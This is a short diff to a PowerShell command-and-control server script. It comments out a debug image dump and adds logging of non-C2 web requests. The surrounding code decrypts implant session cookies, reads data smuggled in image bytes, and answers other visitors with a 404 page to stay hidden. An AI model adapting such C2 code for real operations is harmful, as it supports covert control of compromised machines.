@@ -1648,8 +1648,8 @@ $message =[Convert]::ToBase64String($Bytes)
             $targetStream.Close() 
             $targetStream.Dispose()
 
-            #if you want to look at the image that is transfered back each time :)
-            [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
+            # if you want to look at the image that is transfered back each time :)
+            # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
             $encryptedString = $buffer[1500..$size2]
             $cookiesin = $request.Cookies -replace 'SessionID=', ''
             $cookieplaintext = Decrypt-String $key $cookiesin   
@@ -1723,8 +1723,13 @@ $message =[Convert]::ToBase64String($Bytes)
         }
     }
     }
+
     # if a web request comes in that is not for the c2 server, send default 404 response
-    if (!$message) {$message = $httpresponse}
+    if (!$message) {
+        $message = $httpresponse
+        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
+        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
+    }
     
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
